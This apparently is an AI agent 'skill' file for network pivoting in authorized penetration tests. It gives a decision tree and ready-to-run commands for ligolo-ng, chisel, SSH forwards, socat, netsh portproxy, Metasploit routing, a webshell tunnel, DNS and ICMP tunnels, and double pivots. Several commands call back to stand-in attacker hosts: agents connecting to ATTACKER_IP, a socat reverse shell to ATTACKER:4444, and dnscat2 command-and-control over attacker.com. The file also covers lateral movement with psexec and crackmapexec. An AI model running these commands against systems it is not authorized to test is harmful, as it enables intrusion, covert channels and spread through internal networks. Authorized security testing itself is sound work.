---
name: network-pivoting
description: Network pivoting and tunneling specialist for authorized pentests — covers ligolo-ng (TUN-based routed tunnel), chisel (HTTP SOCKS tunnel), SSH port forwarding and dynamic proxies, proxychains, socat TCP/UDP relay, netsh portproxy (Windows native), Metasploit route/socks_proxy, dnscat2 (DNS tunnel C2), ptunnel-ng (ICMP tunnel), neo-reGeorg (HTTP webshell tunnel), and double-pivot chaining. Use when needing to reach internal network segments via a compromised host. Triggers on: pivoting, tunneling, ligolo, chisel, proxychains, SSH port forward, SOCKS proxy, double pivot, lateral movement network, dnscat, DNS tunnel, ICMP tunnel, port forward.
---

# Skill: network-pivoting

## Trigger

Fire when the task involves:
- Routing traffic through a compromised host to reach internal segments
- Setting up a SOCKS proxy through a pivot
- Creating port forwards to expose internal services
- Multi-hop (double/triple) pivot chains
- Egress-constrained environments (DNS-only, ICMP-only, HTTP-only)
- Windows native pivoting without binary drops

## Instructions

### Phase 1 — Decision Tree

```
Are you already in a Meterpreter session?
  YES → use route + socks_proxy (Section 7)
  NO  → continue...

Can you drop a binary on the pivot?
  NO  → SSH tunnel (Section 3) OR netsh portproxy (Section 8) OR socat (Section 6)
  YES → continue...

What egress is available from pivot?
  Any high port out  → ligolo-ng (Section 4) [PREFERRED 2026]
  Port 80/443 only   → chisel (Section 5) OR neo-reGeorg (Section 9)
  Port 22 out        → SSH reverse tunnel (Section 3)
  UDP 53 only        → dnscat2 (Section 10)
  ICMP only          → ptunnel-ng (Section 11)

How many hops needed?
  1 hop  → single tool
  2+ hop → double pivot chain (Section 12)
```

### Phase 2 — Three Fundamental Operations

```
1. Port Forward   → "Expose port X on pivot as port Y on my machine"
   Use: SSH -L / -R, netsh portproxy, socat

2. SOCKS Proxy    → "Route ALL my TCP traffic through the pivot"
   Use: SSH -D, chisel server+client, Metasploit socks_proxy

3. Routed Tunnel  → "Make the internal network appear as a directly
                     reachable subnet (no proxychains needed)"
   Use: ligolo-ng (2026 standard), OpenVPN over SSH
```

### Phase 3 — SSH Tunneling (Zero Binary Drop)

```bash
# Local port forward: expose INTERNAL:3389 as LOCAL:3389
ssh -L 3389:INTERNAL_HOST:3389 user@PIVOT_HOST

# Dynamic SOCKS proxy (all traffic via pivot)
ssh -D 1080 user@PIVOT_HOST
# Then: proxychains nmap -sT -p 80,443,3389 INTERNAL_HOST

# Remote port forward (pivot calls back, useful for reverse access)
ssh -R 4444:localhost:4444 user@PIVOT_HOST

# Jump host chain (2-hop)
ssh -J user@PIVOT1 user@PIVOT2 -D 1080

# Background + keepalive
ssh -f -N -D 1080 -o ServerAliveInterval=30 user@PIVOT_HOST
```

### Phase 4 — ligolo-ng (PREFERRED 2026 — Real TUN Interface)

```bash
# ligolo-ng creates a real routed network interface — no proxychains needed
# nmap, bloodhound-python, impacket, CrackMapExec work NATIVELY

# ATTACKER setup
# Download from: https://github.com/nicocha30/ligolo-ng/releases
./proxy -selfcert    # starts proxy server (listen on :11601 by default)

# Target/pivot setup (upload ligolo-ng agent)
./agent -connect ATTACKER_IP:11601 -ignore-cert

# Back on attacker proxy:
>> session          # list sessions
>> session 1        # select session
>> tunnel_start --tun ligolo   # or >> start --tun ligolo

# Add route to internal network
sudo ip route add 192.168.1.0/24 dev ligolo

# NOW run tools directly (no proxychains):
nmap -sT -p 445,3389 192.168.1.0/24
bloodhound-python -d corp.local -u user -p pass -ns 192.168.1.1 -c all
impacket-psexec corp.local/admin:pass@192.168.1.50
```

### Phase 5 — chisel (HTTP-Wrapped SOCKS Tunnel)

```bash
# Download single Go binary from: https://github.com/jpillora/chisel/releases
# Beats most egress filters (looks like HTTP/HTTPS)

# ATTACKER (server mode)
./chisel server --reverse --port 8080

# PIVOT TARGET (client mode)
./chisel client ATTACKER_IP:8080 R:socks

# ATTACKER uses SOCKS5 on 127.0.0.1:1080
proxychains nmap -sT -p 22,80,443,3389 INTERNAL_HOST

# Specific port forward
./chisel client ATTACKER_IP:8080 R:3389:INTERNAL_HOST:3389

# HTTPS mode (evade DPI)
./chisel server --reverse --port 443 --tls-key server.key --tls-cert server.crt
./chisel client --tls-skip-verify https://ATTACKER:443 R:socks
```

### Phase 6 — socat (Universal Relay)

```bash
# TCP port forward (relay PIVOT_PORT to INTERNAL:PORT)
socat TCP-LISTEN:8080,fork TCP:INTERNAL_HOST:80

# UDP relay
socat UDP-LISTEN:53,fork UDP:8.8.8.8:53

# Upgrade netcat shell to PTY
socat exec:'bash -li',pty,stderr,setsid,sigint,sane TCP:ATTACKER:4444

# SSL wrap (encrypted tunnel)
socat OPENSSL-LISTEN:443,cert=server.pem,verify=0,fork TCP:INTERNAL_HOST:80

# File transfer through pivot
socat -u TCP-LISTEN:9999,fork OPEN:received_file.txt  # receiver
socat -u OPEN:file.txt TCP:PIVOT:9999                  # sender
```

### Phase 7 — Metasploit route + socks_proxy

```
# From Meterpreter session:
meterpreter > background
msf > route add 192.168.1.0/24 [SESSION_ID]
msf > use auxiliary/server/socks_proxy
msf > set SRVPORT 1080
msf > set VERSION 5
msf > run -j

# proxychains config (/etc/proxychains4.conf):
# socks5 127.0.0.1 1080

# Use any tool:
proxychains nmap -sT -p 445 192.168.1.0/24
proxychains crackmapexec smb 192.168.1.0/24 -u admin -p pass
```

### Phase 8 — netsh portproxy (Windows Native, No Binary Drop)

```powershell
# Expose internal RDP as port 3389 on the pivot (persists across reboots)
netsh interface portproxy add v4tov4 `
  listenport=3389 listenaddress=0.0.0.0 `
  connectport=3389 connectaddress=INTERNAL_HOST

# List all portproxy rules
netsh interface portproxy show all

# Delete rule
netsh interface portproxy delete v4tov4 listenport=3389 listenaddress=0.0.0.0

# Firewall allow (if needed)
netsh advfirewall firewall add rule name="Pivot RDP" dir=in action=allow protocol=TCP localport=3389
```

### Phase 9 — neo-reGeorg (HTTP Webshell Tunnel)

```bash
# When only port 80/443 is allowed AND you have a web shell
git clone https://github.com/L-codes/Neo-reGeorg
# Generate tunnel script for target language:
python3 neoreg.py generate -k password123

# Upload tunnel.php / tunnel.jsp / tunnel.aspx to web server
# Connect SOCKS5 through it:
python3 neoreg.py -k password123 -u http://target.com/tunnel.php -p 1080
# SOCKS5 on 127.0.0.1:1080
proxychains nmap -sT INTERNAL_HOST
```

### Phase 10 — dnscat2 (DNS Tunnel — UDP 53 Only)

```bash
# Server (attacker controls authoritative DNS for attacker.com)
git clone https://github.com/iagox86/dnscat2
cd server && gem install bundler && bundle install
ruby dnscat2.rb attacker.com  # binds UDP 53

# Client (on pivot, compiled binary)
./dnscat --dns domain=attacker.com
# Creates an encrypted command channel over DNS

# SOCKS proxy through dnscat2 tunnel:
dnscat2> session -i 1
command (victim01)> listen 0.0.0.0:1080 socks
```

### Phase 11 — ptunnel-ng (ICMP Tunnel — ICMP Only)

```bash
# When ONLY ICMP (ping) is allowed through the firewall
git clone https://github.com/utoni/ptunnel-ng
cd ptunnel-ng && autoreconf -fi && ./configure && make
# Requires root on both ends

# Server (pivot host — needs root)
sudo ./ptunnel-ng

# Client (attacker)
sudo ./ptunnel-ng -p PIVOT_HOST -l 8080 -r INTERNAL_HOST -R 80
# Now local:8080 → INTERNAL_HOST:80 via ICMP
```

### Phase 12 — Double Pivot Chain

```
Attacker → Pivot1 (DMZ) → Pivot2 (Internal) → Target (Protected)

Step 1: Establish tunnel to Pivot1 (ligolo-ng or chisel)
Step 2: Route 10.20.0.0/24 (Pivot2's network) via ligolo
Step 3: Run chisel CLIENT on Pivot1, SERVER listening on attacker
        chisel client ATTACKER:8080 R:socks   # inside ligolo tunnel
Step 4: proxychains (port 1080) → now reaches Pivot2's network
Step 5: Repeat: establish tunnel from Pivot2 to Pivot1 (new chisel)
        → attacker now has SOCKS through Pivot1 reaching Pivot2's internal net
```

## References

- nicocha30/ligolo-ng — https://github.com/nicocha30/ligolo-ng (MIT)
- jpillora/chisel — https://github.com/jpillora/chisel (MIT)
- iagox86/dnscat2 — https://github.com/iagox86/dnscat2 (BSD-3)
- utoni/ptunnel-ng — https://github.com/utoni/ptunnel-ng
- L-codes/Neo-reGeorg — https://github.com/L-codes/Neo-reGeorg
- yaklang/hack-skills recon-and-methodology — https://github.com/yaklang/hack-skills (MIT)
- H-mmer/pentest-agents — https://github.com/H-mmer/pentest-agents
- Source report: tunnel-rat-deep-research-2026-10-27.md